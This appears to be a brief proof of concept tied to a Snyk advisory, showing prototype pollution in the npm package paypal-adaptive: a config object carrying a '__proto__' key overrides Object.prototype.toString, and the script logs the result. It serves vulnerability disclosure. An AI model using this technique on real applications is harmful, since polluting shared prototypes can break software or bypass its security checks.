https://snyk.io/vuln/SNYK-JS-PAYPALADAPTIVE-565089

var PayPal = require('paypal-adaptive');
var p = new PayPal({"__proto__": {"toString": "JHU"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"})
console.log(({}).toString);